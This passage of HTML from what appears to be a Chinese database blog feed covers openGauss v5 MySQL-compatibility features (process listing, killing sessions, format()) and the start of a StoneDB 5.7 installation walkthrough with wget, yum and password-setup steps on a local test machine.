class="operator">|</span> Activi</span><br><span class="line">ty        <span class="operator">|</span> AutoVacuumMain      <span class="operator">|</span>        <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span>          <span class="operator">|</span>                                 <span class="operator">|</span> autovacuum la</span><br><span class="line">uncher</span><br><span class="line">       <span class="operator">|</span>          <span class="operator">|</span>  <span class="number">12</span> <span class="operator">|</span>            <span class="operator">|</span>       <span class="number">10</span> <span class="operator">|</span> postgres <span class="operator">|</span>                  <span class="operator">|</span>             <span class="operator">|</span>                 <span class="operator">|</span>             <span class="operator">|</span> <span class="number">2023</span></span><br><span class="line"><span class="number">-07</span><span class="number">-07</span> <span class="number">04</span>:<span class="number">50</span>:<span class="number">01.059472</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span>                               <span class="operator">|</span>                               <span class="operator">|</span>                               <span class="operator">|</span> Activi</span><br><span class="line">ty        <span class="operator">|</span> LogicalLauncherMain <span class="operator">|</span>        <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span>          <span class="operator">|</span>                                 <span class="operator">|</span> logical repli</span><br><span class="line">cation launcher</span><br><span class="line"><span class="number">16390</span> <span class="operator">|</span> dophindb <span class="operator">|</span> <span class="number">159</span> <span class="operator">|</span>            <span class="operator">|</span>       <span class="number">10</span> <span class="operator">|</span> postgres <span class="operator">|</span> psql             <span class="operator">|</span>             <span class="operator">|</span>                 <span class="operator">|</span>          <span class="number">-1</span> <span class="operator">|</span> <span class="number">2023</span></span><br><span class="line"><span class="number">-07</span><span class="number">-07</span> <span class="number">05</span>:<span class="number">32</span>:<span class="number">07.47404</span><span class="operator">+</span><span class="number">00</span>  <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">07</span>:<span class="number">22</span>:<span class="number">57.126396</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">07</span>:<span class="number">22</span>:<span class="number">57.126396</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">07</span>:<span class="number">22</span>:<span class="number">57.126399</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span></span><br><span class="line">          <span class="operator">|</span>                     <span class="operator">|</span> active <span class="operator">|</span>             <span class="operator">|</span>          <span class="number">741</span> <span class="operator">|</span>          <span class="operator">|</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> pg_stat_activity; <span class="operator">|</span> client backen</span><br><span class="line">d</span><br><span class="line">       <span class="operator">|</span>          <span class="operator">|</span>   <span class="number">8</span> <span class="operator">|</span>            <span class="operator">|</span>          <span class="operator">|</span>          <span class="operator">|</span>                  <span class="operator">|</span>             <span class="operator">|</span>                 <span class="operator">|</span>             <span class="operator">|</span> <span class="number">2023</span></span><br><span class="line"><span class="number">-07</span><span class="number">-07</span> <span class="number">04</span>:<span class="number">50</span>:<span class="number">01.034653</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span>                               <span class="operator">|</span>                               <span class="operator">|</span>                               <span class="operator">|</span> Activi</span><br><span class="line">ty        <span class="operator">|</span> BgWriterHibernate   <span class="operator">|</span>        <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span>          <span class="operator">|</span>                                 <span class="operator">|</span> background wr</span><br><span class="line">iter</span><br><span class="line">       <span class="operator">|</span>          <span class="operator">|</span>   <span class="number">7</span> <span class="operator">|</span>            <span class="operator">|</span>          <span class="operator">|</span>          <span class="operator">|</span>                  <span class="operator">|</span>             <span class="operator">|</span>                 <span class="operator">|</span>             <span class="operator">|</span> <span class="number">2023</span></span><br><span class="line"><span class="number">-07</span><span class="number">-07</span> <span class="number">04</span>:<span class="number">50</span>:<span class="number">01.033115</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span>                               <span class="operator">|</span>                               <span class="operator">|</span>                               <span class="operator">|</span> Activi</span><br><span class="line">dophindb<span class="operator">=</span>#</span><br></pre></td></tr></table></figure></div>
<p>而在 mysql 中可以使用 show processlist, 如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [sbtest]<span class="operator">&gt;</span> <span class="keyword">show</span> processlist;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+-----------+--------+---------+------+----------+------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> Id <span class="operator">|</span> <span class="keyword">User</span> <span class="operator">|</span> Host      <span class="operator">|</span> db     <span class="operator">|</span> Command <span class="operator">|</span> <span class="type">Time</span> <span class="operator">|</span> State    <span class="operator">|</span> Info             <span class="operator">|</span> Progress <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+-----------+--------+---------+------+----------+------------------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> root <span class="operator">|</span> localhost <span class="operator">|</span> sbtest <span class="operator">|</span> Query   <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span> starting <span class="operator">|</span> <span class="keyword">show</span> processlist <span class="operator">|</span>    <span class="number">0.000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+-----------+--------+---------+------+----------+------------------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>那么在 og 中，也兼容了该语法，只是会将内部线程和外部会话都显示出来：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(shawnyan<span class="variable">@192</span>) [dolphindb] <span class="number">16</span>:<span class="number">14</span>:<span class="number">25</span><span class="operator">&gt;</span> <span class="keyword">show</span> processlist</span><br><span class="line">dolphindb<span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-----------------+-----------------+-------------+----------+-----------------------+-----------+--------------</span></span><br><span class="line"><span class="comment">----------+-------------------------------+-------------------------------+-------+--------+--------------------------------------</span></span><br><span class="line"><span class="comment">--+</span></span><br><span class="line"><span class="operator">|</span>       Id        <span class="operator">|</span>       Pid       <span class="operator">|</span>     QueryId     <span class="operator">|</span> UniqueSqlId <span class="operator">|</span>   <span class="keyword">User</span>   <span class="operator">|</span>         Host          <span class="operator">|</span>    db     <span class="operator">|</span>        Comman</span><br><span class="line">d         <span class="operator">|</span>         BackendStart          <span class="operator">|</span>           XactStart           <span class="operator">|</span> <span class="type">Time</span>  <span class="operator">|</span> State  <span class="operator">|</span>                  Info</span><br><span class="line">  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-----------------+-----------------+-------------+----------+-----------------------+-----------+--------------</span></span><br><span class="line"><span class="comment">----------+-------------------------------+-------------------------------+-------+--------+--------------------------------------</span></span><br><span class="line"><span class="comment">--+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">139817127892736</span> <span class="operator">|</span> <span class="number">139817127892736</span> <span class="operator">|</span>               <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> omm      <span class="operator">|</span>                       <span class="operator">|</span> postgres  <span class="operator">|</span> TxnSnapCaptur</span><br><span class="line">er        <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">02</span>:<span class="number">01</span>:<span class="number">47.418851</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span> [<span class="keyword">null</span>]                        <span class="operator">|</span> <span class="number">19113</span> <span class="operator">|</span> idle   <span class="operator">|</span></span><br><span class="line">  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">139817161455360</span> <span class="operator">|</span> <span class="number">139817161455360</span> <span class="operator">|</span>               <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> omm      <span class="operator">|</span>                       <span class="operator">|</span> postgres  <span class="operator">|</span> ApplyLauncher</span><br><span class="line">          <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">02</span>:<span class="number">01</span>:<span class="number">47.42906</span><span class="operator">+</span><span class="number">00</span>  <span class="operator">|</span> [<span class="keyword">null</span>]                        <span class="operator">|</span> <span class="number">19113</span> <span class="operator">|</span> idle   <span class="operator">|</span></span><br><span class="line">  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">139817111111424</span> <span class="operator">|</span> <span class="number">139817111111424</span> <span class="operator">|</span>               <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> omm      <span class="operator">|</span>                       <span class="operator">|</span> postgres  <span class="operator">|</span> CfsShrinker</span><br><span class="line">          <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">02</span>:<span class="number">01</span>:<span class="number">47.429884</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span> [<span class="keyword">null</span>]                        <span class="operator">|</span> <span class="number">19113</span> <span class="operator">|</span> idle   <span class="operator">|</span></span><br><span class="line">  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">139817094330112</span> <span class="operator">|</span> <span class="number">139817094330112</span> <span class="operator">|</span>               <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> omm      <span class="operator">|</span>                       <span class="operator">|</span> postgres  <span class="operator">|</span> PercentileJob</span><br><span class="line">          <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">02</span>:<span class="number">01</span>:<span class="number">47.438804</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span> [<span class="keyword">null</span>]                        <span class="operator">|</span>     <span class="number">7</span> <span class="operator">|</span> active <span class="operator">|</span></span><br><span class="line">  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">139817077548800</span> <span class="operator">|</span> <span class="number">139817077548800</span> <span class="operator">|</span>               <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> omm      <span class="operator">|</span>                       <span class="operator">|</span> postgres  <span class="operator">|</span> Asp</span><br><span class="line">          <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">02</span>:<span class="number">01</span>:<span class="number">47.440282</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span> [<span class="keyword">null</span>]                        <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span> active <span class="operator">|</span></span><br><span class="line">  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">139817060767488</span> <span class="operator">|</span> <span class="number">139817060767488</span> <span class="operator">|</span>               <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> omm      <span class="operator">|</span>                       <span class="operator">|</span> postgres  <span class="operator">|</span> statement flu</span><br><span class="line">sh thread <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">02</span>:<span class="number">01</span>:<span class="number">47.501574</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span> [<span class="keyword">null</span>]                        <span class="operator">|</span> <span class="number">19113</span> <span class="operator">|</span> idle   <span class="operator">|</span></span><br><span class="line">  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">139817211799296</span> <span class="operator">|</span> <span class="number">139817211799296</span> <span class="operator">|</span>               <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> omm      <span class="operator">|</span>                       <span class="operator">|</span> postgres  <span class="operator">|</span> JobScheduler</span><br><span class="line">          <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">02</span>:<span class="number">01</span>:<span class="number">47.508451</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span> [<span class="keyword">null</span>]                        <span class="operator">|</span>     <span class="number">0</span> <span class="operator">|</span> active <span class="operator">|</span></span><br><span class="line">  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">139816661403392</span> <span class="operator">|</span> <span class="number">139816661403392</span> <span class="operator">|</span>               <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> omm      <span class="operator">|</span>                       <span class="operator">|</span> postgres  <span class="operator">|</span> WorkloadMonit</span><br><span class="line"><span class="keyword">or</span>        <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">02</span>:<span class="number">01</span>:<span class="number">47.527399</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span> [<span class="keyword">null</span>]                        <span class="operator">|</span> <span class="number">19113</span> <span class="operator">|</span> idle   <span class="operator">|</span></span><br><span class="line">  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">139816678184704</span> <span class="operator">|</span> <span class="number">139816678184704</span> <span class="operator">|</span>               <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> omm      <span class="operator">|</span>                       <span class="operator">|</span> postgres  <span class="operator">|</span> workload</span><br><span class="line">          <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">02</span>:<span class="number">01</span>:<span class="number">47.530114</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">02</span>:<span class="number">01</span>:<span class="number">47.536091</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span> <span class="number">19113</span> <span class="operator">|</span> active <span class="operator">|</span> WLM <span class="keyword">fetch</span> <span class="keyword">collect</span> info <span class="keyword">from</span> data node</span><br><span class="line">s <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">139816644622080</span> <span class="operator">|</span> <span class="number">139816644622080</span> <span class="operator">|</span>               <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> omm      <span class="operator">|</span>                       <span class="operator">|</span> postgres  <span class="operator">|</span> WLMArbiter</span><br><span class="line">          <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">02</span>:<span class="number">01</span>:<span class="number">47.540853</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span> [<span class="keyword">null</span>]                        <span class="operator">|</span> <span class="number">19113</span> <span class="operator">|</span> idle   <span class="operator">|</span></span><br><span class="line">  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">139816484992768</span> <span class="operator">|</span> <span class="number">139816484992768</span> <span class="operator">|</span>               <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> shawnyan <span class="operator">|</span> <span class="number">192.168</span><span class="number">.195</span><span class="number">.1</span>:<span class="number">56481</span>   <span class="operator">|</span> postgres  <span class="operator">|</span> HeidiSQL</span><br><span class="line">          <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">02</span>:<span class="number">14</span>:<span class="number">30.859179</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span> [<span class="keyword">null</span>]                        <span class="operator">|</span>     <span class="number">5</span> <span class="operator">|</span> idle   <span class="operator">|</span></span><br><span class="line">  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">139816407267072</span> <span class="operator">|</span> <span class="number">139816407267072</span> <span class="operator">|</span> <span class="number">562949953425604</span> <span class="operator">|</span>   <span class="number">927755207</span> <span class="operator">|</span> shawnyan <span class="operator">|</span> <span class="number">192.168</span><span class="number">.195</span><span class="number">.128</span>:<span class="number">14942</span> <span class="operator">|</span> dolphindb <span class="operator">|</span> gsql</span><br><span class="line">          <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">07</span>:<span class="number">14</span>:<span class="number">15.693419</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-07</span><span class="number">-07</span> <span class="number">07</span>:<span class="number">20</span>:<span class="number">20.074231</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span>     <span class="number">0</span> <span class="operator">|</span> active <span class="operator">|</span> <span class="keyword">show</span> processlist</span><br><span class="line"><span class="operator">+</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="operator">|</span>                 <span class="operator">|</span>                 <span class="operator">|</span>             <span class="operator">|</span>          <span class="operator">|</span>                       <span class="operator">|</span>           <span class="operator">|</span></span><br><span class="line">          <span class="operator">|</span>                               <span class="operator">|</span>                               <span class="operator">|</span>       <span class="operator">|</span>        <span class="operator">|</span> ;</span><br><span class="line">  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-----------------+-----------------+-------------+----------+-----------------------+-----------+--------------</span></span><br><span class="line"><span class="comment">----------+-------------------------------+-------------------------------+-------+--------+--------------------------------------</span></span><br><span class="line"><span class="comment">--+</span></span><br><span class="line">(<span class="number">12</span> <span class="keyword">rows</span>)</span><br></pre></td></tr></table></figure></div>
<p>这当前这个演示示例中，我们看到了一个命令为 HeidiSQL 的进程，此时我们想杀掉这个会话，<br>
那么在 pg 中需要使用 <code>select pg_terminate_backend(pid);</code></p>
<p>而在兼容 mysql 的 og 里可以使用 <code>kill &lt;id&gt;</code> 命令来处理：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(shawnyan<span class="variable">@192</span>) [dolphindb] <span class="number">16</span>:<span class="number">31</span>:<span class="number">27</span><span class="operator">&gt;</span> kill <span class="number">139816484992768</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">result</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> t      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<p>再次查询进程信息，发现对应 id 的进程已经消失。</p>
<h3 id="字符处理">字符处理</h3>
<p>dophin 对个别数据类型，及四则运算都有一定程度的改动，由于篇幅有限，详细内容请参考文档。<br>
这里演示一下 format 函数的使用， pg 中不支持，</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [sbtest]<span class="operator">&gt;</span> <span class="keyword">select</span> format(<span class="number">1234.567</span>,<span class="number">2</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> format(<span class="number">1234.567</span>,<span class="number">2</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>,<span class="number">234.57</span>           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.004</span> sec)</span><br><span class="line"></span><br><span class="line">postgres<span class="operator">=</span># <span class="keyword">select</span> format(<span class="number">1234.567</span>,<span class="number">2</span>);</span><br><span class="line">ERROR:  <span class="keyword">function</span> format(<span class="type">numeric</span>, <span class="type">integer</span>) does <span class="keyword">not</span> exist</span><br><span class="line">LINE <span class="number">1</span>: <span class="keyword">select</span> format(<span class="number">1234.567</span>,<span class="number">2</span>);</span><br><span class="line">               <span class="operator">^</span></span><br><span class="line">HINT:  <span class="keyword">No</span> <span class="keyword">function</span> <span class="keyword">matches</span> the given name <span class="keyword">and</span> argument types. You might need <span class="keyword">to</span> <span class="keyword">add</span> explicit type casts.</span><br></pre></td></tr></table></figure></div>
<p>在 og 中的效果如下，与mairadb中的表现一致：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(shawnyan<span class="variable">@192</span>) [dolphindb] <span class="number">16</span>:<span class="number">53</span>:<span class="number">19</span><span class="operator">&gt;</span> <span class="keyword">select</span> format(<span class="number">1234.567</span>,<span class="number">2</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span>  format  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>,<span class="number">234.57</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<p>但需要说明的是，og 中默认使用 en_US 格式，还可以指定其他格式，如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(shawnyan<span class="variable">@192</span>) [dolphindb] <span class="number">16</span>:<span class="number">54</span>:<span class="number">38</span><span class="operator">&gt;</span> <span class="keyword">select</span> format(<span class="number">1234.567</span>,<span class="number">2</span>,<span class="string">&#x27;de_DE&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span>  format  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1.234</span>,<span class="number">57</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<p>德语的数字标点和英文中的有所区别。</p>
<h2 id="总结">总结</h2>
<p>关于 Dophin 插件还有很多特性有待探索，比如最基础的数据类型比对，后期有时间可以专门出个长篇与大家分享。</p>
<p>openGauss 作为国产数据库的标杆产品，有着庞大的资源投入与关注度，希望 openGauss 可以持续发力，为国产数据库事业添砖加瓦。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/656609" >https://www.modb.pro/db/656609 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzIyMDE3ODk1Nw==&amp;mid=2247510030&amp;idx=5&amp;sn=0742406cbe3bf3d0d002fdca326392a1" >2023-07-14, 【我和openGauss的故事】浅尝 openGauss v5.0.0 的 MySQL 语法兼容性 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>openGauss</category>
        <category>og v5</category>
      </categories>
      <tags>
        <tag>opengauss</tag>
        <tag>og v5</tag>
      </tags>
  </entry>
  <entry>
    <title>StoneDB 初体验 | StoneDB-5.7-v1.0.4 安装及新特性速览</title>
    <url>/2023/stonedb/stonedb-install/</url>
    <content><![CDATA[<p>来都来了，点个 Star 吧，799 颗星了。🌟🌟🌟</p>
<img  alt="stonedb1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230705-bec846e3-893f-4e3b-820e-820a3dda5015.png"
                      referrerpolicy="no-referrer"
                >
<blockquote>
<p>StoneDB 是由石原子科技公司自主设计、研发的国内首款基于 MySQL 内核打造的开源 HTAP（Hybrid Transactional and Analytical Processing）融合型数据库，可实现与 MySQL 的无缝切换。StoneDB 具备超高性能、实时分析等特点，为用户提供一站式 HTAP 解决方案。</p>
<p>StoneDB 100% 兼容 MySQL 5.6、5.7、8.0 协议和 MySQL 生态等重要特性，支持 MySQL 常用的功能及语法，支持 MySQL 生态中的系统工具和客户端，如 Navicat、Workbench、mysqldump、mydumper。由于 100% 兼容 MySQL，因此 StoneDB 的所有工作负载都可以继续使用 MySQL 数据库体系运行。</p>
<p>StoneDB 专门针对 OLAP 应用程序进行了设计和优化，支持百亿数据场景下进行高性能、多维度字段组合的复杂查询，相对比社区版的 MySQL，其查询速度提升了十倍以上。</p>
<p>StoneDB 采用基于知识网格技术和列式存储引擎，该存储引擎为海量数据背景下 OLAP 应用而设计，通过列式存储数据、知识网格过滤、高效数据压缩等技术，为应用系统提供低成本和高性能的数据查询支持。</p>
</blockquote>
<img  alt="stonedb2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230705-5635519e-ac56-4b5e-a201-1f1cb73d4fba.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="安装">安装</h2>
<p>StoneDB 官方提供了 RPM 包，可以快速体验 StoneDB，下面是安装步骤。</p>
<h3 id="1-下载">1. 下载</h3>
<p>可以从 GitHub 或者 Gitee 进行下载。也可从官网找到下载链接，不过官网的链接也指向了 GitHub。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/stoneatom/stonedb/releases/download/5.7-v1.0.4-alpha/stonedb-ce-5.7-v1.0.4-alpha.el7.x86_64.rpm</span><br></pre></td></tr></table></figure></div>
<h3 id="2-安装">2. 安装</h3>
<p>直接 Yum 安装即可，无需额外安装其他依赖。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install stonedb-ce-5.7-v1.0.4-alpha.el7.x86_64.rpm</span><br></pre></td></tr></table></figure></div>
<h3 id="3-启动">3. 启动</h3>
<p>无需预先调整配置，一键启动，开箱即用。需要注意的是，安装时已将文件目录的属主变更为 mysql， 所以需要使用 mysql 用户进行启动。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@centos7 ~]$ /opt/stonedb57/install/mysql_server start</span><br><span class="line">Starting Stonedbbasedir::: /opt/stonedb57/install/</span><br><span class="line">bindir::: /opt/stonedb57/install//bin</span><br><span class="line">datadir::: /opt/stonedb57/install/data/</span><br><span class="line">mysqld_pid::: /opt/stonedb57/install/data/mysqld.pid</span><br><span class="line">.2023-07-05T01:45:12.486648Z mysqld_safe Logging to &#x27;/opt/stonedb57/install/data/centos7.shawnyan.com.err&#x27;.</span><br><span class="line">2023-07-05T01:45:12.520868Z mysqld_safe Starting mysqld daemon with databases from /opt/stonedb57/install/data</span><br><span class="line">....................[  OK  ]</span><br><span class="line">[mysql@centos7 ~]$</span><br></pre></td></tr></table></figure></div>
<h3 id="4-安装成功">4. 安装成功</h3>
<p>安装成功后，登陆 StoneDB，可以看到版本号为：<code>5.7.36-StoneDB-v1.0.4&#125;</code>，emm… 这里多了个 <code>&#125;</code> 🧐</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@centos7 ~]$ cat /opt/stonedb57/install/data/mysqld.log |grep password</span><br><span class="line">2023-07-05T01:29:07.594205Z 1 [Note] A temporary password is generated for root@localhost: KrsiqidHq6:k</span><br><span class="line">[mysql@centos7 ~]$ /opt/stonedb57/install/bin/mysql -uroot -p -S /opt/stonedb57/install/tmp/mysql.sock</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 3</span><br><span class="line">Server version: 5.7.36-StoneDB-v1.0.4&#125;</span><br><span class="line"></span><br><span class="line">Copyright (c) 2021, 2022 StoneAtom Group Holding Limited</span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">alter user <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified by <span class="string">&#x27;stonedb123&#x27;</span>;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<img  alt="stonedb3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230705-e5e6026e-efd1-4721-92b0-d819eaeaaa2e.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="5-可以使用-GUI-工具连接">5. 可以使用 GUI 工具连接</h3>
<p>可以新建用户，并用 GUI 工具连接，更加直观方便快捷的感受 StoneDB。</p>
<img  alt="stonedb4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230705-f5a73af3-680b-42bb-bcb9-3b826d5ac7b6.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="新特性体验">新特性体验</h2>
<h3 id="1-支持-update-ignore-语法">1. 支持 <code>update ignore</code> 语法</h3>
<p>当更新 TIANMU 引擎的表时，主键冲突的记录将被跳过，并执行后续的更新操作。</p>
<p>关于 TIANMU 引擎， 是 StoneDB 的默认引擎，当前版本支持 MySQL 5.7，具体基线版本为 MySQL 5.7.36，这使得 StoneDB 可以兼容 MySQL 5.7 协议。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">show engines;</span></span><br><span class="line">+--------------------+---------+----------------------------------------------------------------+--------------+------+------------+</span><br><span class="line">| Engine             | Support | Comment                                                        | Transactions | XA   | Savepoints |</span><br><span class="line">+--------------------+---------+----------------------------------------------------------------+--------------+------+------------+</span><br><span class="line">...</span><br><span class="line">| TIANMU             | DEFAULT | Tianmu storage engine                                          | YES          | NO   | NO         |</span><br><span class="line">...</span><br><span class="line">+--------------------+---------+----------------------------------------------------------------+--------------+------+------------+</span><br><span class="line">10 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p>演示示例：</p>
<p>创建测试表</p>
